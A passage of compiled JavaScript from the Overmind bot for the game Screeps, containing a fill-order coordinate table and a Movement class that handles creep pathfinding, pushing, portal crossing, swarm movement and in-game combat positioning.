        }, { 'x': 23, 'y': 30 }, { 'x': 23, 'y': 29 }, { 'x': 22, 'y': 29 }, { 'x': 22, 'y': 28 }, { 'x': 21, 'y': 28 }, {
            'x': 21,
            'y': 27
        }],
    upperLeft: [{ 'x': 23, 'y': 21 }, { 'x': 23, 'y': 22 }, { 'x': 24, 'y': 22 }, { 'x': 23, 'y': 23 }, {
            'x': 22,
            'y': 23
        }, { 'x': 22, 'y': 24 }, { 'x': 23, 'y': 25 }, { 'x': 21, 'y': 24 }, { 'x': 21, 'y': 25 }, { 'x': 20, 'y': 25 }, {
            'x': 20,
            'y': 26
        }, { 'x': 22, 'y': 21 }, { 'x': 22, 'y': 22 }, { 'x': 21, 'y': 22 }, { 'x': 21, 'y': 23 }, { 'x': 20, 'y': 23 }, {
            'x': 20,
            'y': 24
        }],
    upperRight: [{ 'x': 24, 'y': 20 }, { 'x': 25, 'y': 20 }, { 'x': 25, 'y': 21 }, { 'x': 26, 'y': 21 }, {
            'x': 26,
            'y': 22
        }, { 'x': 27, 'y': 22 }, { 'x': 27, 'y': 23 }, { 'x': 25, 'y': 23 }, { 'x': 28, 'y': 23 }, { 'x': 28, 'y': 24 }, {
            'x': 29,
            'y': 23
        }, { 'x': 29, 'y': 22 }, { 'x': 28, 'y': 22 }, { 'x': 28, 'y': 21 }, { 'x': 27, 'y': 21 }, { 'x': 27, 'y': 20 }, {
            'x': 26,
            'y': 20
        }]
};
// Used to generate energy structure ordering for spawn.spawnCreep()
const energyStructureOrder = [].concat(quadrantFillOrder.lowerRight, quadrantFillOrder.upperLeft, quadrantFillOrder.lowerLeft, quadrantFillOrder.upperRight);

var Movement_1;
const NO_ACTION = -20;
const CROSSING_PORTAL = -21;
const ERR_CANNOT_PUSH_CREEP = -30;
const REPORT_CPU_THRESHOLD = 1000; // Report when creep uses more than this amount of CPU over lifetime
const REPORT_SWARM_CPU_THRESHOLD = 1500;
const DEFAULT_STUCK_VALUE = 2; // Marked as stuck after this many ticks
const STATE_PREV_X = 0;
const STATE_PREV_Y = 1;
const STATE_STUCK = 2;
const STATE_CPU = 3;
const STATE_DEST_X = 4;
const STATE_DEST_Y = 5;
const STATE_DEST_ROOMNAME = 6;
const STATE_CURRENT_X = 7;
const STATE_CURRENT_Y = 8;
const MovePriorities = {
    [Roles.manager]: 1,
    [Roles.queen]: 2,
    [Roles.melee]: 3,
    [Roles.ranged]: 4,
    [Roles.guardMelee]: 5,
    // [Roles.ranged]: 6,
    [Roles.transport]: 8,
    [Roles.worker]: 9,
    default: 10,
};
/**
 * This is the movement library for Overmind. It was originally based on BonzAI's Traveler library, but it has been
 * extensively modified to integrate more tightly with the Overmind framework and add additional functionality.
 */
let Movement = Movement_1 = class Movement {
    // Core creep movement functions ===================================================================================
    /**
     * Move a creep to a destination
     */
    static goTo(creep, destination, options = {}) {
        if (creep.blockMovement && !options.force) {
            return ERR_BUSY;
        }
        if (creep.spawning) {
            return NO_ACTION;
        }
        if (creep.fatigue > 0) {
            Movement_1.circle(creep.pos, 'aqua', .3);
            return ERR_TIRED;
        }
        // Set default options
        _.defaults(options, {
            ignoreCreeps: true,
            repathOnceVisible: !!options.waypoints || !!options.avoidSK,
        });
        // initialize data object
        if (!creep.memory._go) {
            creep.memory._go = {};
        }
        const moveData = creep.memory._go;
        // set destination according to waypoint specifications; finalDestination is the true destination
        destination = normalizePos(destination);
        const finalDestination = destination;
        if (options.waypoints) {
            destination = this.getDestination(destination, options.waypoints, moveData);
        }
        Pathing.updateRoomStatus(creep.room);
        // Fixes bug that causes creeps to idle on the other side of a room
        if (options.range != undefined && destination.rangeToEdge <= options.range) {
            options.range = Math.min(Math.abs(destination.rangeToEdge - 1), 0);
        }
        // manage case where creep is nearby destination
        const rangeToDestination = creep.pos.getRangeTo(destination);
        if (options.range != undefined && rangeToDestination <= options.range) {
            if (destination.isEqualTo(finalDestination)) {
                delete creep.memory._go;
                return NO_ACTION;
            }
            else {
                // debug
                console.log(`Destination ${destination} not equal to final destination ${finalDestination}!`);
                if (!moveData.waypointsVisited) {
                    moveData.waypointsVisited = [];
                }
                moveData.waypointsVisited.push(destination.name);
                // call goTo again to path to the final destination
                return this.goTo(creep, finalDestination, options);
            }
        }
        else if (rangeToDestination <= 1) {
            // move onto destination
            if (rangeToDestination == 1 && !options.range) {
                const direction = creep.pos.getDirectionTo(destination);
                if (destination.isWalkable(options.ignoreCreepsOnDestination)) {
                    return creep.move(direction, !!options.force);
                }
            }
            else { // at destination
                if (!moveData.fleeWait) {
                    delete creep.memory._go;
                }
                return NO_ACTION;
            }
        }
        // traverse through a portal waypoint or check that has just been traversed
        if (options.waypoints && !destination.isEqualTo(finalDestination)) {
            const portalTraversed = this.traversePortalWaypoint(creep, destination);
            if (portalTraversed) {
                return this.goTo(creep, finalDestination, options);
            }
            else {
                return CROSSING_PORTAL;
            }
        }
        // handle delay
        if (moveData.delay != undefined) {
            if (moveData.delay <= 0) {
                delete moveData.delay;
            }
            else {
                moveData.delay--;
                return OK;
            }
        }
        const state = this.deserializeState(moveData, destination);
        // // verify creep is in the location it thinks it should be in
        // if (state.currentXY) {
        //  let {x, y} = state.currentXY;
        //  if (!(creep.pos.x == x && creep.pos.y == y)) { // creep thought it would move last tick but didn't
        //      log.debug(`${creep.print} has gotten off track; deleting path!`);
        //      delete moveData.path;
        //  }
        // }
        // uncomment to visualize destination
        // this.circle(destination, "orange");
        // check if creep is stuck
        if (this.isStuck(creep, state)) {
            state.stuckCount++;
            this.circle(creep.pos, 'magenta', state.stuckCount * .3);
            // pushedCreep = this.pushCreep(creep);
        }
        else {
            state.stuckCount = 0;
        }
        // handle case where creep is stuck
        if (!options.stuckValue) {
            options.stuckValue = DEFAULT_STUCK_VALUE;
        }
        if (state.stuckCount >= options.stuckValue && Math.random() > .5) {
            options.ignoreCreeps = false;
            delete moveData.path;
        }
        // delete path cache if destination is different
        if (!destination.isEqualTo(state.destination)) {
            if (options.movingTarget && state.destination.isNearTo(destination)) {
                moveData.path += state.destination.getDirectionTo(destination);
                state.destination = destination;
            }
            else {
                delete moveData.path;
            }
        }
        // randomly repath with specified probability
        if (options.repath && Math.random() < options.repath) {
            delete moveData.path;
        }
        // repath if there was no vision for this room when pathfinding was run
        if (options.repathOnceVisible && !(moveData.roomVisibility || {})[creep.room.name]) {
            delete moveData.path;
        }
        // TODO: repath if you are not on expected next position
        // pathfinding
        let newPath = false;
        if (!moveData.path || moveData.path.length == 0) {
            newPath = true;
            if (creep.spawning) {
                return ERR_BUSY;
            }
            state.destination = destination;
            // Compute terrain costs
            if (!options.direct && !options.terrainCosts) {
                options.terrainCosts = getTerrainCosts(creep.creep);
            }
            const cpu = Game.cpu.getUsed();
            // (!) Pathfinding is done here
            const ret = Pathing.findPath(creep.pos, destination, options);
            const cpuUsed = Game.cpu.getUsed() - cpu;
            state.cpu = _.round(cpuUsed + state.cpu);
            if (Game.time % 10 == 0 && state.cpu > REPORT_CPU_THRESHOLD) {
                log.alert(`Movement: heavy cpu use: ${creep.name}, cpu: ${state.cpu}. ` +
                    `(${creep.pos.print} ${rightArrow} ${destination.print})`);
            }
            let color$$1 = 'orange';
            if (ret.incomplete) {
                // uncommenting this is a great way to diagnose creep behavior issues
                log.debug(`Movement: incomplete path for ${creep.print}! ` +
                    `(${creep.pos.print} ${rightArrow} ${destination.print})`);
                color$$1 = 'red';
            }
            this.circle(creep.pos, color$$1);
            moveData.path = Pathing.serializePath(creep.pos, ret.path, color$$1);
            const roomsVisited = _.unique(_.map(ret.path, pos => pos.roomName));
            if (!moveData.roomVisibility) {
                moveData.roomVisibility = {};
            }
            for (const roomName of roomsVisited) {
                moveData.roomVisibility[roomName] = !!Game.rooms[roomName];
            }
            state.stuckCount = 0;
        }
        if (!moveData.path || moveData.path.length == 0) {
            this.serializeState(creep, destination, state, moveData);
            return ERR_NO_PATH;
        }
        // push creeps out of the way if needed
        if (!options.noPush) {
            const obstructingCreep = this.findBlockingCreep(creep);
            if (obstructingCreep && this.shouldPush(creep, obstructingCreep)) {
                const pushedCreep = this.pushCreep(creep, obstructingCreep);
                if (!pushedCreep) {
                    this.serializeState(creep, destination, state, moveData);
                    return ERR_CANNOT_PUSH_CREEP;
                }
            }
        }
        // consume path
        if (state.stuckCount == 0 && !newPath) {
            moveData.path = moveData.path.substr(1);
        }
        const nextDirection = parseInt(moveData.path[0], 10);
        // predict next coordinate (for verification)
        const nextPos = creep.pos.getPositionAtDirection(nextDirection);
        this.serializeState(creep, destination, state, moveData, { x: nextPos.x, y: nextPos.y });
        return creep.move(nextDirection, !!options.force);
    }
    /**
     * Gets the effective destination based on the waypoints to travel over and the creep.memory._go object.
     * Finds the next waypoint which has not been marked as visited in moveData.
     */
    static getDestination(destination, waypoints, moveData) {
        const waypointsVisited = _.compact(_.map(moveData.waypointsVisited || [], posName => getPosFromString(posName)));
        const nextWaypoint = _.find(waypoints, waypoint => !_.any(waypointsVisited, visited => waypoint.isEqualTo(visited)));
        if (nextWaypoint) {
            return nextWaypoint;
        }
        else {
            return destination;
        }
    }
    /**
     * Navigate a creep through a portal
     */
    static traversePortalWaypoint(creep, portalPos) {
        if (creep.pos.roomName == portalPos.roomName && creep.pos.getRangeTo(portalPos) > 1) {
            log.error(`Movement.travelPortalWaypoint() should only be called in range 1 of portal!`);
        }
        const moveData = creep.memory._go || {};
        if (portalPos.room && !portalPos.lookForStructure(STRUCTURE_PORTAL)) {
            log.error(`Portal not found at ${portalPos.print}!`);
            return false;
        }
        moveData.portaling = true;
        const crossed = this.crossPortal(creep, portalPos);
        if (crossed) {
            moveData.portaling = false;
            if (!moveData.waypointsVisited) {
                moveData.waypointsVisited = [];
            }
            moveData.waypointsVisited.push(portalPos.name);
            return true; // done crossing portal
        }
        else {
            return false; // still trying to cross portal
        }
    }
    /**
     * Cross a portal that is within range 1 and then step off of the exit portal. Returns true when creep is on the
     * other side of the portal and no longer standing on a portal.
     */
    static crossPortal(creep, portalPos) {
        if (Game.map.getRoomLinearDistance(creep.pos.roomName, portalPos.roomName) > 5) {
            // if you're on the other side of the portal
            const creepOnPortal = !!creep.pos.lookForStructure(STRUCTURE_PORTAL);
            if (!creepOnPortal) {
                return true;
            }
            else {
                creep.moveOffCurrentPos();
                return false;
            }
            // console.log(agent.name + " waiting on other side");
        }
        else {
            if (creep.pos.getRangeTo(portalPos) > 1) {
                log.error(`Movement.crossPortal() should only be called in range 1 of portal!`);
            }
            else {
                const dir = creep.pos.getDirectionTo(portalPos);
                creep.move(dir);
            }
            // console.log(agent.name + " traveling to waypoint");
            return false;
        }
    }
    static getPushPriority(creep) {
        if (!creep.memory)
            return MovePriorities.default;
        if (creep.memory._go && creep.memory._go.priority) {
            return creep.memory._go.priority;
        }
        else {
            return MovePriorities[creep.memory.role] || MovePriorities.default;
        }
    }
    static shouldPush(pusher, pushee) {
        if (this.getPushPriority(pusher) < this.getPushPriority(pushee)) {
            // pushee less important than pusher
            return true;
        }
        else {
            pushee = normalizeZerg(pushee);
            if (isZerg(pushee)) {
                // pushee is equal or more important than pusher
                if (pushee.task && pushee.task.isWorking) {
                    // If creep is doing a task, only push out of way if it can go somewhere else in range
                    const targetPos = pushee.task.targetPos;
                    const targetRange = pushee.task.settings.targetRange;
                    return _.filter(pushee.pos.availableNeighbors().concat(pusher.pos), pos => pos.getRangeTo(targetPos) <= targetRange).length > 0;
                }
                else if (!pushee.isMoving) {
                    // push creeps out of the way if they're idling
                    return true;
                }
            }
            else {
                return pushee.my;
            }
        }
        return false;
    }
    static getPushDirection(pusher, pushee) {
        const possiblePositions = pushee.pos.availableNeighbors();
        pushee = normalizeZerg(pushee);
        if (isZerg(pushee)) {
            let preferredPositions = [];
            if (pushee.task && pushee.task.isWorking) { // push creeps out of the way when they're doing task
                const targetPos = pushee.task.targetPos;
                const targetRange = pushee.task.settings.targetRange;
                preferredPositions = _.filter(possiblePositions, pos => pos.getRangeTo(targetPos) <= targetRange);
            }
            if (preferredPositions[0]) {
                return pushee.pos.getDirectionTo(preferredPositions[0]);
            }
        }
        else {
            log.debug(`${pushee.name}@${pushee.pos.print} is not Zerg! (Why?)`);
        }
        return pushee.pos.getDirectionTo(pusher);
    }
    static findBlockingCreep(creep) {
        const nextDir = Pathing.nextDirectionInPath(creep);
        if (nextDir == undefined)
            return;
        const nextPos = Pathing.positionAtDirection(creep.pos, nextDir);
        if (!nextPos)
            return;
        return nextPos.lookFor(LOOK_CREEPS)[0];
    }
    /* Push a blocking creep out of the way */
    static pushCreep(creep, otherCreep) {
        if (!otherCreep.memory)
            return false;
        otherCreep = normalizeZerg(otherCreep);
        const pushDirection = this.getPushDirection(creep, otherCreep);
        const otherData = otherCreep.memory._go;
        // Push the creep and update the state
        const outcome = otherCreep.move(pushDirection);
        const otherNextPos = otherCreep.pos.getPositionAtDirection(pushDirection);
        if (isZerg(otherCreep)) {
            if (outcome == OK) {
                if (otherData && otherData.path && !otherCreep.blockMovement) { // don't add to path unless you moved
                    otherData.path = Pathing.oppositeDirection(pushDirection) + otherData.path;
                    this.updateStateNextCoord(otherData, otherNextPos);
                }
                otherCreep.blockMovement = true;
                return true;
            }
            else {
                return false;
            }
        }
        else {
            // Shouldn't reach here ideally
            log.debug(`${otherCreep.name}@${otherCreep.pos.print} is not Zerg! (Why?)`);
            if (outcome == OK) {
                if (otherData && otherData.path) {
                    otherData.path = Pathing.oppositeDirection(pushDirection) + otherData.path;
                    this.updateStateNextCoord(otherData, otherNextPos);
                }
                return true;
            }
            else {
                return false;
            }
        }
    }
    // TODO: this is bugged somewhere
    /**
     * Recursively moves creeps out of the way of a position to make room for something, such as a spawning creep.
     * If suicide is specified and there is no series of move commands that can move a block of creeps out of the way,
     * the lead blocking creep will suicide. Returns whether the position has been vacated.
     */
    static vacatePos(pos, suicide = false) {
        // prevent creeps from moving onto pos
        const nearbyCreeps = _.compact(_.map(pos.findInRange(FIND_MY_CREEPS, 2), creep => Overmind.zerg[creep.name]));
        _.forEach(nearbyCreeps, creep => creep.blockMovement = true);
        // recurively move creeps off of the position
        const creep = pos.lookFor(LOOK_CREEPS)[0];
        if (!creep)
            return true;
        const blockingCreep = Overmind.zerg[creep.name];
        if (!blockingCreep)
            return true;
        const moved = !!this.recursivePush(blockingCreep);
        if (moved) {
            log.debug(`Moved creep ${blockingCreep.name} off of ${blockingCreep.pos.print}.`);
            return true;
        }
        else {
            if (suicide) {
                log.debug(`Could not move creep ${blockingCreep.name} off of ${blockingCreep.pos.print}! ` +
                    `Suiciding creep! (RIP)`);
                blockingCreep.suicide();
                return true;
            }
            else {
                log.debug(`Could not move creep ${blockingCreep.name} off of ${blockingCreep.pos.print}!`);
                return false;
            }
        }
    }
    /**
     * Recursively pushes creeps out of the way of a root position.
     */
    static recursivePush(creep, excludePos = []) {
        const creepPos = creep.pos;
        let movePos = _.find(creepPos.availableNeighbors(), neighbor => !_.any(excludePos, pos => pos.isEqualTo(neighbor)));
        if (movePos) {
            log.debug(`Moving ${creep.name} to ${JSON.stringify(movePos)}`);
            this.goTo(creep, movePos, { force: true });
            creep.blockMovement = true;
            return creepPos;
        }
        else { // Every position is occupied by a creep
            const availablePositions = _.filter(creepPos.availableNeighbors(true), neighbor => !_.any(excludePos, pos => pos.isEqualTo(neighbor)));
            for (const otherPos of availablePositions) {
                const otherCreep = otherPos.lookFor(LOOK_CREEPS)[0];
                if (!otherCreep)
                    continue;
                const otherZerg = Overmind.zerg[otherCreep.name];
                if (!otherZerg)
                    continue;
                movePos = this.recursivePush(otherZerg, excludePos.concat(creepPos));
                if (movePos) {
                    this.goTo(creep, movePos, { range: 0, force: true });
                    creep.blockMovement = true;
                    return creepPos;
                }
            }
        }
    }
    /**
     * Travel to a room
     */
    static goToRoom(creep, roomName, options = {}) {
        options.range = 23;
        return this.goTo(creep, new RoomPosition(25, 25, roomName), options);
    }
    /**
     * Travel to a room
     */
    static goToRoom_swarm(swarm, roomName, options = {}) {
        options.range = 24 - Math.max(swarm.width, swarm.height);
        return this.swarmMove(swarm, new RoomPosition(25, 25, roomName), options);
    }
    /**
     * Park a creep off-roads
     */
    static park(creep, pos = creep.pos, maintainDistance = false) {
        const road = creep.pos.lookForStructure(STRUCTURE_ROAD);
        if (!road)
            return OK;
        // Move out of the bunker if you're in it
        if (!maintainDistance && creep.colony.bunker && insideBunkerBounds(creep.pos, creep.colony)) {
            return this.goTo(creep, creep.colony.controller.pos);
        }
        let positions = _.sortBy(creep.pos.availableNeighbors(), p => p.getRangeTo(pos));
        if (maintainDistance) {
            const currentRange = creep.pos.getRangeTo(pos);
            positions = _.filter(positions, p => p.getRangeTo(pos) <= currentRange);
        }
        let swampPosition;
        for (const position of positions) {
            if (position.lookForStructure(STRUCTURE_ROAD))
                continue;
            const terrain = position.lookFor(LOOK_TERRAIN)[0];
            if (terrain === 'swamp') {
                swampPosition = position;
            }
            else {
                return creep.move(creep.pos.getDirectionTo(position));
            }
        }
        if (swampPosition) {
            return creep.move(creep.pos.getDirectionTo(swampPosition));
        }
        return this.goTo(creep, pos);
    }
    /**
     * Moves a creep off of the current tile to the first available neighbor
     */
    static moveOffCurrentPos(creep) {
        const destinationPos = _.first(creep.pos.availableNeighbors());
        if (destinationPos) {
            const direction = creep.pos.getDirectionTo(destinationPos);
            return creep.move(direction);
        }
        else {
            log.debug(`${creep.print} can't move off current pos!`);
        }
    }
    /**
     * Moves onto an exit tile
     */
    static moveOnExit(creep) {
        if (creep.pos.rangeToEdge > 0 && creep.fatigue == 0) {
            const directions = [1, 3, 5, 7, 2, 4, 6, 8];
            for (const direction of directions) {
                const position = creep.pos.getPositionAtDirection(direction);
                const terrain = position.lookFor(LOOK_TERRAIN)[0];
                if (terrain != 'wall' && position.rangeToEdge == 0) {
                    const outcome = creep.move(direction);
                    return outcome;
                }
            }
            log.warning(`moveOnExit() assumes nearby exit tile, position: ${creep.pos}`);
            return ERR_NO_PATH;
        }
    }
    /**
     * Moves off of an exit tile
     */
    static moveOffExit(creep, avoidSwamp = true) {
        let swampDirection;
        const directions = [1, 3, 5, 7, 2, 4, 6, 8];
        for (const direction of directions) {
            const position = creep.pos.getPositionAtDirection(direction);
            if (position.rangeToEdge > 0 && position.isWalkable()) {
                const terrain = position.lookFor(LOOK_TERRAIN)[0];
                if (avoidSwamp && terrain == 'swamp') {
                    swampDirection = direction;
                    continue;
                }
                return creep.move(direction);
            }
        }
        if (swampDirection) {
            return creep.move(swampDirection);
        }
        return ERR_NO_PATH;
    }
    /**
     * Moves off of an exit tile toward a given direction
     */
    static moveOffExitToward(creep, pos, detour = true) {
        for (const position of creep.pos.availableNeighbors()) {
            if (position.getRangeTo(pos) == 1) {
                return this.goTo(creep, position);
            }
        }
        if (detour) {
            return this.goTo(creep, pos, { ignoreCreeps: false });
        }
    }
    /**
     * Moves a pair of creeps; the follower will always attempt to be in the last position of the leader
     */
    static pairwiseMove(leader, follower, target, opts = {}, allowedRange = 1) {
        let outcome;
        if (leader.room != follower.room) {
            if (leader.pos.rangeToEdge == 0) {
                // Leader should move off of exit tiles while waiting for follower
                outcome = leader.goTo(target, opts);
            }
            follower.goTo(leader);
            return outcome;
        }
        const range = leader.pos.getRangeTo(follower);
        if (range > allowedRange) {
            // If leader is farther than max allowed range, allow follower to catch up
            if (follower.pos.rangeToEdge == 0 && follower.room == leader.room) {
                follower.moveOffExitToward(leader.pos);
            }
            else {
                follower.goTo(leader, { stuckValue: 1 });
            }
        }
        else if (follower.fatigue == 0) {
            // Leader should move if follower can also move this tick
            outcome = leader.goTo(target, opts);
            if (range == 1) {
                follower.move(follower.pos.getDirectionTo(leader));
            }
            else {
                follower.goTo(leader, { stuckValue: 1 });
            }
        }
        return outcome;
    }
    /**
     * Moves a swarm to a destination, accounting for group pathfinding
     */
    static swarmMove(swarm, destination, options = {}) {
        if (swarm.fatigue > 0) {
            Movement_1.circle(swarm.anchor, 'aqua', .3);
            console.log('tired');
            return ERR_TIRED;
        }
        // Set default options
        _.defaults(options, {
            range: 1,
            ignoreCreeps: true,
            exitCost: 10,
        });
        // if (options.range! < Math.max(swarm.width, swarm.height)) {
        //  log.warning(`Range specified is ${options.range}; not allowable for ${swarm.width}x${swarm.height} swarm!`);
        // }
        destination = normalizePos(destination);
        // initialize data object
        if (!swarm.memory._go) {
            swarm.memory._go = {};
        }
        const moveData = swarm.memory._go;
        // manage case where creep is nearby destination
        if (options.range != undefined && swarm.minRangeTo(destination) <= options.range &&
            swarm.maxRangeTo(destination) <= options.range + Math.max(swarm.width, swarm.height)) {
            delete swarm.memory._go;
            console.log('no action');
            return NO_ACTION;
        }
        const state = this.deserializeState(moveData, destination);
        // check if swarm is stuck
        let stuck = false;
        if (state.lastCoord !== undefined) {
            if (sameCoord(swarm.anchor, state.lastCoord)) { // didn't move
                stuck = true;
            }
            else if (isExit(swarm.anchor) && isExit(state.lastCoord)) { // moved against exit
                stuck = true;
            }
        }
        if (stuck) {
            state.stuckCount++;
            this.circle(swarm.anchor, 'magenta', state.stuckCount * .3);
        }
        else {
            state.stuckCount = 0;
        }
        // handle case where creep is stuck
        if (!options.stuckValue) {
            options.stuckValue = DEFAULT_STUCK_VALUE;
        }
        if (state.stuckCount >= options.stuckValue && Math.random() > .5) {
            options.ignoreCreeps = false;
            delete moveData.path;
        }
        // delete path cache if destination is different
        if (!destination.isEqualTo(state.destination)) {
            delete moveData.path;
        }
        if (options.repath && Math.random() < options.repath) { // randomly repath with specified probability
            delete moveData.path;
        }
        // pathfinding
        let newPath = false;
        if (!moveData.path) {
            newPath = true;
            state.destination = destination;
            const cpu = Game.cpu.getUsed();
            // (!) Pathfinding is done here
            const ret = Pathing.findSwarmPath(swarm.anchor, destination, swarm.width, swarm.height, options);
            const cpuUsed = Game.cpu.getUsed() - cpu;
            state.cpu = _.round(cpuUsed + state.cpu);
            if (Game.time % 10 == 0 && state.cpu > REPORT_SWARM_CPU_THRESHOLD) {
                log.alert(`Movement: heavy cpu use for swarm with ${_.first(swarm.creeps).print}, cpu: ${state.cpu}. ` +
                    `(${swarm.anchor.print} ${rightArrow} ${destination.print})`);
            }
            let color$$1 = 'orange';
            if (ret.incomplete) {
                log.debug(`Movement: incomplete path for swarm with ${_.first(swarm.creeps).print}! ` +
                    `(${swarm.anchor.print} ${rightArrow} ${destination.print})`);
                color$$1 = 'red';
            }
            this.circle(swarm.anchor, color$$1);
            moveData.path = Pathing.serializePath(swarm.anchor, ret.path, color$$1);
            state.stuckCount = 0;
        }
        // uncomment to visualize destination
        this.circle(destination, 'orange');
        // Serialize state for swarm
        moveData.state = [swarm.anchor.x, swarm.anchor.y, state.stuckCount, state.cpu, destination.x, destination.y,
            destination.roomName];
        if (!moveData.path || moveData.path.length == 0) {
            console.log(`No path from ${swarm.anchor.print} to ${destination.print}!`);
            return ERR_NO_PATH;
        }
        // consume path
        if (state.stuckCount == 0 && !newPath) {
            moveData.path = moveData.path.substr(1);
        }
        const nextDirection = parseInt(moveData.path[0], 10);
        return swarm.move(nextDirection);
    }
    static combatMoveCallbackModifier(room, matrix, approach, avoid, options) {
        // This is only applied once creep is in the target room
        if (!options.allowExit) {
            Pathing.blockExits(matrix);
        }
        // Add penalties for things you want to avoid
        _.forEach(avoid, avoidThis => {
            let x, y;
            for (let dx = -avoidThis.range; dx <= avoidThis.range; dx++) {
                for (let dy = -avoidThis.range; dy <= avoidThis.range; dy++) {
                    x = avoidThis.pos.x + dx;
                    y = avoidThis.pos.y + dy;
                    matrix.set(x, y, matrix.get(x, y) + options.avoidPenalty);
                }
            }
        });
        // Add bonuses for things you want to approach
        _.forEach(approach, approachThis => {
            let cost;
            let x, y;
            for (let dx = -approachThis.range; dx <= approachThis.range; dx++) {
                for (let dy = -approachThis.range; dy <= approachThis.range; dy++) {
                    x = approachThis.pos.x + dx;
                    y = approachThis.pos.y + dy;
                    cost = matrix.get(x, y);
                    if (cost < 0xff) { // is walkable
                        cost = Math.max(cost - options.approachBonus, 1);
                    }
                    matrix.set(x, y, cost);
                }
            }
        });
        // Prefer to path into open ramparts
        if (options.preferRamparts) {
            Pathing.preferRamparts(matrix, room);
        }
        return matrix;
    }
    static swarmCombatMove(swarm, approach, avoid, options = {}) {
        _.defaults(options, {
            allowExit: false,
            avoidPenalty: 10,
            approachBonus: 5,
            preferRamparts: true,
        });
        const debug$$1 = false;
        const callback = (roomName) => {
            let matrix;
            const room = swarm.roomsByName[roomName];
            if (room) {
                matrix = Pathing.getSwarmDefaultMatrix(room, swarm.width, swarm.height); // already cloned
                // Block positions from other swarms in the room
                const otherCreeps = _.filter(room.creeps, creep => !_.any(swarm.creeps, c => c.name == creep.name));
                Pathing.blockMyCreeps(matrix, room, otherCreeps);
                // Pathing.blockHostileCreeps(matrix, creep.room);
                Movement_1.combatMoveCallbackModifier(room, matrix, approach, avoid, options);
            }
            else {
                matrix = Pathing.getSwarmTerrainMatrix(roomName, swarm.width, swarm.height);
            }
            if (options.displayCostMatrix) {
                Visualizer.displayCostMatrix(matrix, roomName);
            }
            return matrix;
        };
        let outcome = NO_ACTION;
        // Flee from bad things that that you're too close to
        if (avoid.length > 0) {
            const size = Math.max(swarm.width, swarm.height);
            if (_.any(avoid, goal => swarm.minRangeTo(goal) <= goal.range)) {
                const allAvoid = _.flatten(_.map(avoid, goal => _.map(Pathing.getPosWindow(goal.pos, -swarm.width, -swarm.height), pos => ({
                    pos: pos,
                    range: goal.range
                }))));
                if (options.displayAvoid) {
                    const room = swarm.rooms[0];
                    for (const avoid of allAvoid) {
                        const { x, y } = avoid.pos;
                        room.visual.text(avoid.range.toString(), x, y, { color: 'ff0099' });
                    }
                }
                const avoidRet = PathFinder.search(swarm.anchor, allAvoid, {
                    roomCallback: callback,
                    flee: true,
                    maxRooms: options.allowExit ? 5 : 1,
                    plainCost: 2,
                    swampCost: 10,
                });
                if (avoidRet.path.length > 0) {
                    if (debug$$1)
                        Pathing.serializePath(swarm.anchor, avoidRet.path, 'magenta');
                    outcome = swarm.move(swarm.anchor.getDirectionTo(avoidRet.path[0]));
                    if (outcome == OK) {
                        return outcome;
                    }
                }
            }
        }
        // Approach things you want to go to if you're out of range of all the baddies
        if (approach.length > 0) {
            if (!_.any(approach, goal => swarm.minRangeTo(goal) <= goal.range)) {
                const allApproach = _.flatten(_.map(approach, goal => _.map(Pathing.getPosWindow(goal.pos, -swarm.width, -swarm.height), pos => ({
                    pos: pos,
                    range: goal.range
                }))));
                const approachRet = PathFinder.search(swarm.anchor, allApproach, {
                    roomCallback: callback,
                    maxRooms: 1,
                    plainCost: 2,
                    swampCost: 10,
                });
                if (approachRet.path.length > 0) {
                    if (debug$$1)
                        Pathing.serializePath(swarm.anchor, approachRet.path, 'cyan');
                    outcome = swarm.move(swarm.anchor.getDirectionTo(approachRet.path[0]));
                    if (outcome == OK) {
                        return outcome;
                    }
                }
            }
        }
        return outcome;
    }
    static combatMove(creep, approach, avoid, options = {}) {
        _.defaults(options, {
            allowExit: false,
            avoidPenalty: 10,
            approachBonus: 5,
            preferRamparts: true,
        });
        const debug$$1 = false;
        const callback = (roomName) => {
            if (roomName == creep.room.name) {
                const matrix = Pathing.getDefaultMatrix(creep.room).clone();
                Pathing.blockMyCreeps(matrix, creep.room);
                Pathing.blockHostileCreeps(matrix, creep.room);
                Movement_1.combatMoveCallbackModifier(creep.room, matrix, approach, avoid, options);
                if (options.displayCostMatrix) {
                    Visualizer.displayCostMatrix(matrix, roomName);
                }
                return matrix;
            }
            else {
                return !(Memory.rooms[roomName] && Memory.rooms[roomName]["a" /* AVOID */]);
            }
        };
        let outcome = NO_ACTION;
        // Flee from bad things that that you're too close to
        if (avoid.length > 0) {
            if (_.any(avoid, goal => creep.pos.inRangeToXY(goal.pos.x, goal.pos.y, goal.range))
                && !creep.inRampart) {
                const avoidRet = PathFinder.search(creep.pos, avoid, {
                    roomCallback: callback,
                    flee: true,
                    maxRooms: options.allowExit ? 5 : 1,
                    plainCost: 2,
                    swampCost: 10,
                });
                if (avoidRet.path.length > 0) {
                    if (debug$$1)
                        Pathing.serializePath(creep.pos, avoidRet.path, 'magenta');
                    outcome = creep.move(creep.pos.getDirectionTo(avoidRet.path[0]));
                    if (outcome == OK) {
                        return outcome;
                    }
                }
            }
        }
        // Approach things you want to go to if you're out of range of all the baddies
        if (approach.length > 0) {
            if (!_.any(approach, goal => creep.pos.inRangeToXY(goal.pos.x, goal.pos.y, goal.range))) {
                const approachRet = PathFinder.search(creep.pos, approach, {
                    roomCallback: callback,
                    maxRooms: 1,
                    plainCost: 2,
                    swampCost: 10,
                });
                if (approachRet.path.length > 0) {
                    if (debug$$1)
                        Pathing.serializePath(creep.pos, approachRet.path, 'cyan');
                    outcome = creep.move(creep.pos.getDirectionTo(approachRet.path[0]));
                    if (outcome == OK) {
                        return outcome;
                    }
                }
            }
        }
        // Try to maneuver under ramparts if possible
        if (options.preferRamparts && !creep.inRampart && approach.length > 0) {
            const openRamparts = _.filter(creep.room.walkableRamparts, rampart => _.any(approach, g => rampart.pos.inRangeToXY(g.pos.x, g.pos.y, g.range))
                && rampart.pos.isWalkable());
            if (openRamparts.length > 0) {
                const ret = PathFinder.search(creep.pos, _.map(openRamparts, r => ({ pos: r.pos, range: 0 })), {
                    roomCallback: callback,
                    maxRooms: 1,
                    plainCost: 2,
                    swampCost: 10,
                });
                if (ret.path.length > 0) {
                    if (debug$$1)
                        Pathing.serializePath(creep.pos, ret.path, 'green');
                    outcome = creep.move(creep.pos.getDirectionTo(ret.path[0]));
                    if (outcome == OK) {
                        return outcome;
                    }
                }
            }
        }
        return outcome;
    }
    static invasionMoveCallbackModifier(room, matrix) {
        // This is only applied once creep is in the target room
        Pathing.blockExits(matrix);
        for (const hostile of room.invaders) {
